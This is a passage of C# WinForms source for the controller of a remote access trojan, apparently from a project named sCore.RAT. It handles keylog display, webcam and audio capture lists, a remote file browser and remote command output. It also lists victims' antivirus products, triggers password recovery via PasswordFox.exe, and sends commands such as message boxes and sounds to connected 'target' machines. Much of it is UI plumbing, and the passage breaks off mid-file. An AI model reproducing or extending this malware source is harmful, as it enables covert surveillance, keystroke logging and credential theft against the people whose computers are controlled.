        /// Delegate used to short a listView control
        /// </summary>
        /// <param name="lv">The listView to sort</param>
        private delegate void SortListC(ListView lv);

        /// <summary>
        /// Sort a listView control
        /// </summary>
        /// <param name="lv">The listView to short</param>
        private void SortList(ListView lv)
        {
            if (InvokeRequired) //If we need to invoke
            {
                SortListC c = new SortListC(SortList); //Create the callback
                Invoke(c, new object[] { lv }); //Invoke the callback
                return; //Return
            }

            lv.Sorting = SortOrder.Ascending; //Set the shorting order
            lv.Sort(); //Sort the listView
        }

        /// <summary>
        /// Delegate used to display error messages
        /// </summary>
        private delegate void ShowErrorC();

        /// <summary>
        /// Display error message
        /// </summary>
        private void ShowError()
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                ShowErrorC c = new ShowErrorC(ShowError); //Create callback
                this.Invoke(c); //Invoke callback
                return; //Return
            }

            label24.Show(); //Show the error label
        }

        /// <summary>
        /// Delegate used to set the error message's text
        /// </summary>
        /// <param name="errorText">The text to set</param>
        private delegate void SetErrorTextC(string errorText);
        
        /// <summary>
        /// Set the error message's text
        /// </summary>
        /// <param name="errorText">The text to set</param>
        private void SetErrorText(string errorText)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                SetErrorTextC c = new SetErrorTextC(SetErrorText); //Create the callback
                this.Invoke(c, new object[] { errorText }); //Invoke the callback
                return; //Return
            }

            label24.Text = errorText; //Set the error text
        }

        /// <summary>
        /// Create a password recovery fail notification
        /// </summary>
        private void PwuNotification()
        {
            System.Threading.Thread.Sleep(3000); //Wait for 3 seconds
            //msgbox("Try Again!", "PasswordFox.exe is not downloaded please wait 5 seconds and try again\nDownload in progress!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            Msgbox("Error!", "ff.exe (PasswordFox.exe) is not present on the target directory!", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
        }

        /// <summary>
        /// Delegate used to add and items to a listView control
        /// </summary>
        /// <param name="lv">The listView to add the items to</param>
        /// <param name="lvi">The listView item to add</param>
        /// <param name="group">The group to add the item to</param>
        private delegate void lvAddItemCallback(ListView lv, ListViewItem lvi, int group = -1);

        /// <summary>
        /// Add an item to a listView control
        /// </summary>
        /// <param name="lv">The listView to add the item to</param>
        /// <param name="lvi">The item to add</param>
        /// <param name="group">The group to add the item to</param>
        private void LvAddItem(ListView lv, ListViewItem lvi, int group = -1)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                lvAddItemCallback callback = new lvAddItemCallback(LvAddItem); //Create a new callback
                this.Invoke(callback, new object[] { lv, lvi, group }); //Invoke the callback
            }
            else
            {
                if (group != -1) //If we need to set the group
                {
                    lvi.Group = lv.Groups[group]; //Set the group
                }
                lv.Items.Add(lvi); //Add the item to the listView
            }
        }

        /// <summary>
        /// Delegate used to add a web cam to the list
        /// </summary>
        /// <param name="id">The ID of the device</param>
        /// <param name="name">The name of the device</param>
        private delegate void addCamCallback(String id, String name);

        /// <summary>
        /// Add a web cam to the list
        /// </summary>
        /// <param name="id">The ID of the device</param>
        /// <param name="name">The name of the device</param>
        private void AddCam(String id, String name)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                addCamCallback callback = new addCamCallback(AddCam); //Create a callback
                this.Invoke(callback, new object[] { id, name }); //Invoke the callback
            }
            else
            {
                ListViewItem lvi = new ListViewItem
                {
                    Text = id //Set the device ID
                }; //Create a new item
                lvi.SubItems.Add(name); //Set the device name
                listView5.Items.Add(lvi); //Add the item to the listView
            }
        }

        /// <summary>
        /// Delegate used to add an audip device to the list
        /// </summary>
        /// <param name="name">The name of device</param>
        /// <param name="ch">The channel of the device</param>
        private delegate void addAudioCallback(String name, String ch);

        /// <summary>
        /// Add an audio device to the list
        /// </summary>
        /// <param name="name">The name of the device</param>
        /// <param name="ch">The channel of the device</param>
        private void AddAudio(String name, String ch)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                addAudioCallback callback = new addAudioCallback(AddAudio); //Create a callback
                this.Invoke(callback, new object[] { name, ch }); //Invoke the callback
            }
            else
            {
                ListViewItem lvi = new ListViewItem(name); //Create a new listVie item and set the name
                lvi.SubItems.Add(ch); //Set the channel
                listView4.Items.Add(lvi); //Add the item to the listView
                listView4.Items[0].Selected = true; //Select the first item in the listView
            }
        }

        /// <summary>
        /// Delegate used to switch the active tab page
        /// </summary>
        /// <param name="tab">The active tab page to switch to</param>
        public delegate void switchTabC(TabPage tab);

        /// <summary>
        /// Switch the active tab page
        /// </summary>
        /// <param name="tab">The tab page to switch to</param>
        public void SwitchTab(TabPage tab)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                switchTabC callback = new switchTabC(SwitchTab); //Create a callback
                this.Invoke(callback, new object[] { tab }); //Invoke the callback
            }
            else
            {
                tabControl1.SelectedTab = tab; //Switch the selected tab page
            }
        }

        /// <summary>
        /// Delegate used to set the keylog text
        /// </summary>
        /// <param name="dump">The keylog to display</param>
        private delegate void setLogCallback(String dump);

        /// <summary>
        /// Set the keylog text
        /// </summary>
        /// <param name="dump">The keylog to display</param>
        private void SetLog(String dump)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                setLogCallback callback = new setLogCallback(SetLog); //Create a callback
                this.Invoke(callback, new object[] { dump }); //Invoke the callback
            }
            else
            {
                richTextBox3.Text = dump; //Set the keylog text
            }
        }

        /// <summary>
        /// Delegate used to clear a listView's items
        /// </summary>
        /// <param name="lv">The listView to clear</param>
        private delegate void lvClearCallback(ListView lv);

        /// <summary>
        /// Clear the items of a listView
        /// </summary>
        /// <param name="lv">The listView control to clear</param>
        private void LvClear(ListView lv)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                lvClearCallback callback = new lvClearCallback(LvClear); //Create a callback
                this.Invoke(callback, new object[] { lv }); //Invoke the callback
            }
            else
            {
                lv.Items.Clear(); //Clear the listView's items
            }
        }

        /// <summary>
        /// Delegate used to update the directory listing
        /// </summary>
        /// <param name="directory">The directory to list</param>
        private delegate void parentCallback(String directory);

        /// <summary>
        /// Update the directory listing
        /// </summary>
        /// <param name="directory">The directory to list</param>
        private void GetParentDirectory(String directory)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                parentCallback callback = new parentCallback(GetParentDirectory); //Create a callback
                this.Invoke(callback, new object[] { directory }); //Invoke the callback
            }
            else
            {
                String command = "fdir§" + directory; //Construct the command
                SendToTarget(command); //Send the command to the client
                CurrentPath = directory; //Set the current path
                listView3.Items.Clear(); //Clear the items of the file list
            }
        }

        /// <summary>
        /// Delegate used to display a local message box
        /// </summary>
        /// <param name="title">The title of the message box</param>
        /// <param name="text">The text of the message box</param>
        /// <param name="button">Message box buttons</param>
        /// <param name="icon">Message box icon</param>
        /// <returns>The dialog result of the message box</returns>
        private delegate DialogResult msgboxCallback(String title, String text, MessageBoxButtons button, MessageBoxIcon icon);

        /// <summary>
        /// Display a local message box
        /// </summary>
        /// <param name="title">The title of the message box</param>
        /// <param name="text">The text of the message box</param>
        /// <param name="button">Message box buttons</param>
        /// <param name="icon">Message box icon</param>
        /// <returns>The dialog result of the message box</returns>
        private DialogResult Msgbox(String title, String text, MessageBoxButtons button, MessageBoxIcon icon)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                msgboxCallback callback = new msgboxCallback(Msgbox); //Create a callback
                return (DialogResult)this.Invoke(callback, new object[] { title, text, button, icon }); //Invoke and return
            }
            else
            {
                return MessageBox.Show(this, text, title, button, icon); //Display the message box and return the result
            }
        }

        /// <summary>
        /// Delegate used to start the file editor window
        /// </summary>
        /// <param name="content">The content to edit</param>
        /// <param name="parent">Reference to the main form</param>
        private delegate void startEditorCallback(String content, Form1 parent);

        /// <summary>
        /// Start the file editor
        /// </summary>
        /// <param name="content">The content to edit</param>
        /// <param name="parent">Reference to the main form</param>
        private void StartEditor(String content, Form1 parent)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                startEditorCallback callback = new startEditorCallback(StartEditor); //Create a callback
                this.Invoke(callback, new object[] { content, parent }); //Invoke the callback
            }
            else
            {
                Edit writer = new Edit(content, parent); //Create a new editor
                writer.Show(); //Start the editor
            }
        }

        /// <summary>
        /// Convert file sizes from bytes to higher measurements
        /// </summary>
        /// <param name="byt">The byte size of the file</param>
        /// <returns>The highest possible measurement of the size</returns>
        private string Convert(string byt)
        {
            string stackName = "B"; //Declare the measurement id
            //Console.WriteLine(byt);

            if (byt == "N/A") //Check if size is unknown
            {
                return "Directory"; //It's a directory
            }

            try //Try
            {
                float bytes = float.Parse(byt); //Convert the bytes to a float
                float div_result = 0; //Declare the divided result

                if (bytes >= 0 && bytes < 1024) //If it falls in the range of bytes
                {
                    div_result = bytes; //Return the bytes
                }
                else if (bytes >= 1024 && bytes < (1024 * 1024)) //If it falls in range of kilo bytes
                {
                    stackName = "KB"; //Set hte measurement id
                    div_result = bytes / 1024; //Convert the bytes to kilo bytes
                }
                else if (bytes >= (1024 * 1024) && bytes < (1024 * 1024 * 1024)) //If it falls in range of mega bytes
                {
                    stackName = "MB"; //Set the measurement id
                    div_result = bytes / (1024 * 1024); //Convert the bytes to mega bytes
                }
                else if (bytes >= (1024 * 1024 * 1024)) //If it's out of the mega byte range
                {
                    stackName = "GB"; //Set the measurement id
                    div_result = bytes / (1024 * 1024 * 1024); //Convert the bytes to giga bytes
                }

                return $"{div_result.ToString("0.00")} {stackName}"; // Return the result
            }
            catch (Exception) //Something went wrong
            {
               return "ERROR"; //Return error
            }
        }

        /// <summary>
        /// Delegate used to add entriey to the file list
        /// </summary>
        /// <param name="name">The name of the entry</param>
        /// <param name="size">The size of the entry</param>
        /// <param name="crtime">The creation time of the entry</param>
        /// <param name="path">The full path of the entry</param>
        private delegate void addFile(String name, String size, String crtime, String path);

        /// <summary>
        /// Add entries to the file list
        /// </summary>
        /// <param name="name">The name of the entry</param>
        /// <param name="size">The size of the entry</param>
        /// <param name="crtime">The creation time of the entry</param>
        /// <param name="path">The full path of the entry</param>
        private void AddFileCallback(String name, String size, String crtime, String path)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                addFile callback = new addFile(AddFileCallback); //Create a callback
                this.Invoke(callback, new object[] { name, size, crtime, path }); //Invoke the callback
            }
            else
            {
                ListViewItem lvi = new ListViewItem
                {
                    Text = name //Set the entry name
                }; //Create a new listView item
                lvi.SubItems.Add(size); //Set the entry size
                lvi.SubItems.Add(crtime); //Set the entry creation time
                lvi.SubItems.Add(path); //Set the entry full path
                listView3.Items.Add(lvi); //Add the item to the list
                listView3.Items[0].Selected = true; //Select the first item of the list
            }
        }

        /// <summary>
        /// Delegate used to add command line output
        /// </summary>
        /// <param name="text">The output to add</param>
        private delegate void appendText(String text);

        /// <summary>
        /// Append command line output to the Remote Cmd view
        /// </summary>
        /// <param name="text">The text to append to the output</param>
        private void Append(String text)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                appendText callback = new appendText(Append); //Create a new callback
                this.Invoke(callback, new object[] { text }); //Invoke the callback
            }
            else
            {
                richTextBox2.Text += text + Environment.NewLine; //Append the output text
            }
        }

        /// <summary>
        /// Delegate used to add processes to the list
        /// </summary>
        /// <param name="name">The name of the process</param>
        /// <param name="responding">The response state of the process</param>
        /// <param name="title">The title of the processe's main window</param>
        /// <param name="priority">The priorty of the process</param>
        /// <param name="path">The full path of the executed file</param>
        /// <param name="id">The PID</param>
        private delegate void setProcInfo(String name, String responding, String title, String priority, String path, String id);

        /// <summary>
        /// Add processes to the list
        /// </summary>
        /// <param name="name">The name of the process</param>
        /// <param name="responding">The response state of the process</param>
        /// <param name="title">The title of the processe's main window</param>
        /// <param name="priority">The priorty of the process</param>
        /// <param name="path">The full path of the executed file</param>
        /// <param name="id">The PID</param>
        private void SetprocInfoCallback(String name, String responding, String title, String priority, String path, String id)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                setProcInfo callback = new setProcInfo(SetprocInfoCallback); //Create a new callback
                this.Invoke(callback, new object[] { name, responding, title, priority, path, id }); //Invoke the callback
            }
            else
            {
                ListViewItem lvi = new ListViewItem
                {
                    Text = name //Set the process name
                }; //Create a new listView item
                lvi.SubItems.Add(id); //Set the PID
                lvi.SubItems.Add(responding); //Set the response state
                lvi.SubItems.Add(title); //Set the main window's title
                lvi.SubItems.Add(priority); //Set the processe's priority
                lvi.SubItems.Add(path); //Set the execute file's path

                listView2.Items.Add(lvi); //Add the provess to the list
            }

        }

        /// <summary>
        /// Delegate used to add client info to the list
        /// </summary>
        /// <param name="name">The name of the client's machine</param>
        /// <param name="ip">The local IPv4 address of the client</param>
        /// <param name="time">The time of the client's machine</param>
        /// <param name="av">The anti virus product of the client's machine</param>
        /// <param name="id">The ID of the client</param>
        private delegate void setlvClientInfo(String name, String ip, String time, String av, int id);

        /// <summary>
        /// Add client info to the list
        /// </summary>
        /// <param name="name">The name of the client's machine</param>
        /// <param name="ip">The local IPv4 address of the client</param>
        /// <param name="time">The time of the client's machine</param>
        /// <param name="av">The anti virus product of the client's machine</param>
        /// <param name="id">The ID of the client</param>
        private void SetlvClientInfoCallback(String name, String ip, String time, String av, int id)
        {
            if (this.InvokeRequired) //if we need to invoke
            {
                setlvClientInfo k = new setlvClientInfo(SetlvClientInfoCallback); //Create a new callback
                this.Invoke(k, new object[] { name, ip, time, av, id }); //Invoke the callback
            }
            else
            {
                ListViewItem client = listView1.Items[id]; //Get the client's list item
                client.SubItems.Add(name); //Set the machine name
                client.SubItems.Add(ip); //Set the mmachine IPv4 local address
                client.SubItems.Add(time); //Set the machine time
                client.SubItems.Add(av); //Set the machine anti virus product
            }
        }

        /// <summary>
        /// Delegate used to add screens to the list
        /// </summary>
        /// <param name="screenCount">The screen to add</param>
        private delegate void setScreenCount(char screenCount);

        /// <summary>
        /// Set the screen count of the remote client
        /// </summary>
        /// <param name="screenCount">The screen count to set</param>
        private void SetClientScreenCountCallBack(char screenCount)
        {
            if (InvokeRequired) //If we need to invoke
            {
                setScreenCount callBack = new setScreenCount(SetClientScreenCountCallBack); //Create new callback
                Invoke(callBack, new object[] { screenCount }); //Invoke the callback
            }
            else
            {
                cmboChooseScreen.Items.Add(screenCount); //Add the screen to the list
            }
        }

#endregion

#region Route Window Function

        /// <summary>
        /// Event handler for handling a removed tool strip item with route window
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void TSItemRemoved(object sender, ToolStripItemEventArgs e)
        {
            System.Threading.Monitor.Enter(TSLockObject);
            tsitem.Remove(e.Item);
            int tsIndex = tsitem.FindIndex((x) => { if (x == e.Item) return true; else return false; });
            tsrefname.RemoveAt(tsIndex);
            System.Threading.Monitor.Exit(TSLockObject);
        }

        /// <summary>
        /// Event handler for handling a removed tool strip item with route window
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void TSItemAdded(object sender, ToolStripItemEventArgs e)
        {
            System.Threading.Monitor.Enter(TSLockObject);
            tsitem.Add(e.Item);
            tsrefname.Add(e.Item.Name);
            System.Threading.Monitor.Exit(TSLockObject);
        }

        /// <summary>
        /// Control value update from routed windows
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void UpdateValues(object sender, EventArgs e)
        {
            if (setvalue.Count != 0) //If we need to set values
            {
                Console.WriteLine("update setValue"); //Debug Function
                List<String> tempInst = setvalue; //Temp store the setValue list

                try //Try
                {
                    foreach (String task in setvalue) //Loop through the setvalue tasks
                    {
                        foreach (TabPage t in tabControl1.TabPages) //Loop thorught each TabPage
                        {
                            bool breakTab = false; //Break event control
                            Control.ControlCollection all = t.Controls; //Get the controls on the TabPage
                            foreach (Control c in all) //Loop through all the controls
                            {
                                String name = task.Split('§')[0]; //Get the name of the control

                                if (name == c.Name) //If the control names match
                                {
                                    if (name.StartsWith("textBox") || name.StartsWith("richTextBox")) //If it's a textbox type control
                                    {
                                        c.Text = task.Split('§')[1]; //Set the requested text
                                        tempInst.Remove(task); //Remove the task from the list
                                    }
                                    if (name.StartsWith("checkBox")) //If it's a checkBox control
                                    {
                                        String param = task.Split('§')[1]; //Get the value parameter
                                        bool set = false; //Declare a new boolean parameter
                                        if (param.ToLower() == "true") set = true; //Convert the parameter to boolean
                                        CheckBox cb = c as CheckBox; //Convert the control to a checkBox
                                        cb.Checked = set; //Set the check state
                                        tempInst.Remove(task); //Remove the task from the list
                                    }
                                    if (name.StartsWith("comboBox")) //If it's a combobox control
                                    {
                                        String param = task.Split('§')[1]; //Get the parameter
                                        ComboBox cb = c as ComboBox; //Convert the control to combobox
                                        cb.SelectedItem = param; //Set the selected item
                                        tempInst.Remove(task); //Remove the task from the list
                                    }
                                    if (name.StartsWith("listView")) //If it's a listView control
                                    {
                                        String param = task.Split('§')[1]; //Get the value paramenter
                                        int set = int.Parse(param); //Convert the value to integer
                                        ListView lv = c as ListView; //Convert the control to listView
                                        lv.Items[lv.SelectedIndices[0]].Selected = false; //Deselect the currently selected element
                                        lv.Items[set].Selected = true; //Select our element
                                        Console.WriteLine("setvalue INDEX: " + set.ToString()); //Debug Function
                                        //lv.Focus();
                                        tempInst.Remove(task); //Remove the task
                                    }
                                    breakTab = true; //If we found our control, then break out of the current tab
                                }
                            }

                            if (breakTab) //If break tab is signalled then break
                            {
                                break; //Break the loop
                            }

                        }

                        if (task.Split('§')[0].StartsWith("tabControl1")) //If we need to update the selected page
                        {
                            Console.WriteLine("setValue tabControl1.SelectedPage"); //Debug Function
                            String param = task.Split('§')[1]; //Get the value parameter
                            tabControl1.SelectedTab = pages[int.Parse(param) - 1]; //Set the selected tab
                            tempInst.Remove(task); //Remove the task from the list
                            //Console.WriteLine(tempInst.Count.ToString());
                        }
                    }

                    setvalue = tempInst; //Update the setValue commands

                }
                catch (Exception ex) //If we messed something up
                {
                    //Do nothing
                    Console.WriteLine("Routed Window value update error  ERROR  =" + ex.Message); //Write the error to the console
                }
            }
            List<String> tmp = new List<String>(); //Create a new temporary list object

            foreach (TabPage t in tabControl1.TabPages) //Loop thorugh the TabPages
            {
                Control.ControlCollection all = t.Controls; //Get all control on the current page
                foreach (Control c in all) //Loop through the controls
                {
                    //()(c.Name);
                    if (c.Name.StartsWith("button")) //if the control is a button
                    {
                        tmp.Add(c.Name + "§" + c.Text); //Store the button name and text
                    }
                    if (c.Name.StartsWith("label")) //If the control is a label
                    {
                        tmp.Add(c.Name + "§" + c.Text); //Store the name and the text
                    }
                    if (c.Name.StartsWith("checkBox")) //If the control is a checkBox
                    {
                        CheckBox cc = (CheckBox)c; //Convert the control to a checkBox
                        tmp.Add(c.Name + "§" + cc.Checked.ToString().ToLower()); //Store the name and the value
                    }
                    if (c.Name.StartsWith("comboBox")) //If the control is a combobox
                    {
                        ComboBox cb = (ComboBox)c; //Convert the control to a combobox
                        string si = ""; //Declare the selected item
                        if (cb.SelectedItem != null) si = cb.SelectedItem.ToString(); //Get the selected item
                        tmp.Add(c.Name + "§" + si); //Add the name and the selected item
                    }
                    if (c.Name.StartsWith("textBox")) //If the control is a textBox
                    {
                        tmp.Add(c.Name + "§" + c.Text); //Store the name and the value
                    }
                    if (c.Name.StartsWith("richTextBox")) //If the control is a richTextBox
                    {
                        tmp.Add(c.Name + "§" + c.Text); //Store the name and the value
                    }
                    if (c.Name.StartsWith("listView")) //If the control is a listView
                    {
                        ListView lv = (ListView)c; //Convert the control to a listView
                        String select = ""; //Declare the selected item
                        String items = lv.Name + "§"; //Declare the items and the name
                        if (lv.SelectedIndices.Count > 0) //If items are selected
                        {
                            select = lv.SelectedIndices[0].ToString(); //Get the selected item's index
                            //Console.WriteLine("LV Select Index Stored: " + select);
                        }
                        else
                        {
                            select = "-1"; //No selected item
                        }


                        foreach (ListViewItem lvi in lv.Items) //Loop through the items
                        {
                            String emt = ""; //Declare subitems
                            int sindex = lvi.SubItems.Count; //Get the count of the item's subitems
                            int count = 0; //Declare the subitem count
                            foreach (ListViewItem.ListViewSubItem si in lvi.SubItems) //Loop through the subitems
                            {
                                if (count < sindex) //If it's not the last item
                                {
                                    emt += si.Text + "|"; //Append to the string with separator
                                }
                                else //If it's the last item
                                {
                                    emt += si.Text; //Appen ti the string without separator
                                }

                                count++; //Increment the cout
                            }

                            items += emt + "§"; //Append all subitems to the items
                        }
                        items += select; //Append the selected index to the items
                        tmp.Add(items); //Add the command to the tmp list (all list items)

                    }
                }
            }
            getvalue = tmp; //Set the getvalues command to tmp
            selected = tabControl1.SelectedTab; //Get the selected tabControl
                                                //protectLv = false;
                                                //this.Text = getvalue.Count.ToString();

        }

        /// <summary>
        /// Execute a tool stirp item
        /// </summary>
        /// <param name="name">The name of the item to execute</param>
        public void ExecuteToolStrip(String name)
        {
            System.Threading.Monitor.Enter(TSLockObject);
            int track = 0; //Declare index variable

            foreach (String refname in tsrefname) //Go through every tool strip item
            {
                if (refname != name) //If names doesn't match
                {
                    track++; //Increment the index;
                    continue; //Continue
                }
                tsitem[track].PerformClick(); //Execute the toolstrip item
                //track++; //Increment the index
                break; //Break the loop
            }

            System.Threading.Monitor.Exit(TSLockObject);
        }

        /// <summary>
        /// Get the value of a stored control (from Main Form)
        /// </summary>
        /// <param name="name">The name of the control to get the value of</param>
        /// <returns>The value of the control</returns>
        public static String GetValue(String name)
        {
            String val = ""; //Declare the value
            foreach (String entry in getvalue) //Loop through every stored control
            {
                String key = entry.Split('§')[0]; //Get the key

                if (key == name) //If the key matches the name
                {
                    val = entry.Split('§')[1]; //Set the value
                }
            }

            return val; //Return the value
        }

        /// <summary>
        /// Get the selected index of a control (from Main Form)
        /// </summary>
        /// <param name="name">The name of the control to get the selected index of</param>
        /// <returns>The selected index of the control</returns>
        public int GetSelectedIndex(String name)
        {
            int val = 0; //Declare the value
            foreach (String entry in getvalue) //Go through ech stored control
            {
                String key = entry.Split('§')[0]; //Get the control's key

                if (key == name) //If the key matches the name
                {
                    val = int.Parse(entry.Split('§')[1]); //Store the selected index of the control
                }
            }
            return val; //Return the value
        }

        /// <summary>
        /// Get the selected item of a stored control (from Main Form)
        /// </summary>
        /// <param name="name">The name of the control to get the selected item of</param>
        /// <returns>The selected item of the control</returns>
        public String GetSelectedItem(String name)
        {
            String val = ""; //Declare the value
            foreach (String entry in getvalue) //Loop through every stored control
            {
                String key = entry.Split('§')[0]; //Get the control's key

                if (key == name) //If the key matches the control's name
                {
                    val = entry.Split('§')[1]; //Get the selected item
                }
            }
            return val; //Return the value
        }

        /// <summary>
        /// Get a control checked state (from Main form)
        /// </summary>
        /// <param name="name">The name of the control to get the checked stated of</param>
        /// <returns>The checked stated of the control</returns>
        public bool GetChecked(String name)
        {
            bool val = false; //Declare checked state
            String ret = ""; //Declare the value
            foreach (String entry in getvalue) //Loop through each stored control
            {
                String key = entry.Split('§')[0]; //Get the key of the control
                if (key == name) //If the key matches the control's name
                {
                    ret = entry.Split('§')[1]; //Store the value
                }
            }

            ret = ret.ToLower(); //Convert the value to lower case letters

            if (ret == "true") //if the value is true
            {
                val = true; //set the value to true
            }
            else
            {
                val = false; //Set the value to false
            }

            return val; //Return the value
        }

        /// <summary>
        /// Get the items of a listView control
        /// </summary>
        /// <param name="name">The name of the control</param>
        /// <param name="mode">The mode of getting the item</param>
        /// <returns>The items based on the requested mode</returns>
        public String[] GetItems(String name, String mode)
        {
            List<String> ret = new List<String>(); //Declare a list for results
            Control lvc = Controls.Find(name, true)[0]; //Find the listView control
            ListView lv = (ListView)lvc; //Convert the control to a listView
            if (mode == "selected") //If the mode is selected
            {
                foreach (String entry in getvalue) //Go through the elements
                {
                    String key = entry.Split('§')[0]; //Get the key of the control
                    if (key == name) //if the key of the control matches the control's name
                    {
                        int subCount = entry.LastIndexOf('§') + 1; //Get the subitems count
                        String sItem = entry.Substring(subCount); //Cut every subitem
                        ret.Add(sItem); //Return the last element -> the selected index
                    }
                }
            }
            if (mode == "items") //If mode is items
            {
                foreach (String entry in getvalue) //Go through the stored controls
                {
                    String key = entry.Split('§')[0]; //Get the key of the control
                    if (key == name) //If the key matches the control's name
                    {
                        String nameString = entry.Split('§')[0]; //Get the listView name
                        int subS = nameString.Length + 1; //Set the cut count to it's length + 1 for the separator char
                        String lvString = entry.Substring(subS); //Get the items and the selected item
                        int subE = lvString.LastIndexOf('§'); //Get the last separator char
                        if (subE == -1) return ret.ToArray(); //If no separator chars then just return
                        lvString = lvString.Substring(0, subE); //Cut the selected element (the last element)

                        foreach (String item in lvString.Split('§')) //Split the items
                        {
                            ret.Add(item); //Add the items to the return array
                        }
                    }
                }
            }
            return ret.ToArray(); //Return the values
        }

        /// <summary>
        /// Handle the right clicks on the tab page header
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void tabControl1_Click(object sender, EventArgs e)
        {
            MouseEventArgs me = (MouseEventArgs)e; //Convert the event args to mouse event args

            if (me.Button == System.Windows.Forms.MouseButtons.Right) //If right click was pressed
            {
                ContextMenuStrip cms = new ContextMenuStrip(); //Create a new context menu strip
                cms.Items.Add("Route Window"); //Add the items route window
                cms.Items[0].Click += new EventHandler(RWind); //Assign a click handler
                cms.Show(Cursor.Position); //Show the context menu strip
            }
        }

        /// <summary>
        /// Route TabPage to Window
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void RWind(object sender, EventArgs e)
        {
            TabPage srcRoute = tabControl1.SelectedTab; //Get the route source
            RouteWindow rw = new RouteWindow
            {
                page = srcRoute //Set the page to the route source
            }; //Declare a new route window
            rw.RoutePage(); //Route the page
        }

#endregion

#region UI Event Handlers

        /// <summary>
        /// Start / Stop The server listener
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button1_Click(object sender, EventArgs e)
        {
            if (!IsStartedServer) //If the server is stopped
            {
                SetupServer(); //Setup the server
                IsStartedServer = true; //Set the started flag to true
                button1.Text = "Terminate Server"; //Update the button text
                if (reScanTarget) //If we need to rescan
                {
                    //MessageBox.Show("rescan");
                    tabControl1.SelectedTab = tabPage1; //Select tab page1 (client selection)
                    List<Socket> sock = _clientSockets; //Copy the client list
                    List<Socket> conn = new List<Socket>(); //Create a new list for connected clients
                    foreach (Socket s in sock) //Loop thourgh every client
                    {
                        if (s.Connected) conn.Add(s); //If client is connected, then add it to the connected list
                    }

                    _clientSockets = conn; //Set the client list to the connected clients
                    listView1.Items.Clear(); //Clear the clients list

                    int id = 0; //Declare index variable

                    foreach (Socket client in _clientSockets) //Go through the connected sockets
                    {
                        SendCommand("getinfo-" + id.ToString(), id); //Resend getinfo -> to change the client IDs
                        id++; //Increment the index
                        //MessageBox.Show("getinfo-" + id.ToString());
                    }

                    reScanStart = -1; //Reset the scan target
                    reScanTarget = false;  //Reset the scan flag
                }
                return; //Return
            }
            if (IsStartedServer) //If the server is started
            {
                CloseAllSockets(); //Close all clients and the server socket
                label1.Text = "Server is offline"; //Update the UI
                button1.Text = "Start Server"; //Update button text
                listView1.Items.Clear(); //Clear the client list
            }
        }

        /// <summary>
        /// Select the controlled client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button2_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0) //If an item is selected
            {
                controlClient = int.Parse(listView1.SelectedItems[0].SubItems[0].Text.Replace("Client ", string.Empty));
                sCore.RAT.ServerSettings.SetCurrentClient(hostToken, controlClient); //Set the current client's ID for plugins
                SendCommand("getstart", controlClient); //Get the application startup directory
            }
        }

        /// <summary>
        /// Display remote message box
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button3_Click(object sender, EventArgs e)
        {
            string title = textBox1.Text; //Get the title text
            string text = textBox2.Text; //Get the message text
            string icons = comboBox1.SelectedItem.ToString(); //Get the selected icon
            string buttons = comboBox2.SelectedItem.ToString(); //Get the selected button
            int ico = 0; //Declare int icon code
            int btn = 0; //Declare int button code

            // Map icons and buttons to int numbers!

            switch (icons) //Switch on icons
            {
                case "Error":
                    ico = 1; //Error icon
                    break;

                case "Warning":
                    ico = 2; //Warning icon
                    break;

                case "Information":
                    ico = 3; //Information icon
                    break;

                case "Question":
                    ico = 4; //Question mark icon
                    break;

                case "None":
                    ico = 0; //No icons
                    break;
            }

            switch (buttons) //Switch on buttons
            {
                case "Yes No":
                    btn = 1; //Yes and No buttons
                    break;

                case "Yes No Cancel":
                    btn = 2; //Yes No and Cancel buttons
                    break;

                case "Abort Retry Ignore":
                    btn = 3; //Abort Retry and Ignore buttons
                    break;

                case "Ok Cancel":
                    btn = 4; //Ok and Cancel buttons
                    break;

                case "Ok":
                    btn = 0; //Ok button
                    break;
            }

            //Construct data
            StringBuilder sb = new StringBuilder();
            sb.Append("msg|")
                .Append(title).Append("|")
                .Append(text).Append("|")
                .Append(ico).Append("|")
                .Append(btn).Append("|");
            SendToTarget(sb.ToString()); //Send the command to the client
        }

        /// <summary>
        /// Play frequency on remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button4_Click(object sender, EventArgs e)
        {
            string cmd = "freq-" + textBox3.Text; //Construct the command
            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Play system sound on remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button5_Click(object sender, EventArgs e)
        {
            string opt = comboBox3.SelectedItem.ToString(); //The system sound to play
            string code = "0"; //The code of the sound

            switch (opt) //Switch on opt
            {
                case "Beep":
                    code = "0"; //Beep sound
                    break;

                case "Error":
                    code = "1"; //Error sound
                    break;

                case "Warning":
                    code = "2"; //Warning sound
                    break;

                case "Information":
                    code = "3"; //Information sound
                    break;
            }

            string cmd = "sound-" + code; //Construct the command
            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Execute Text To Speech on a remote client
        /// </summary>
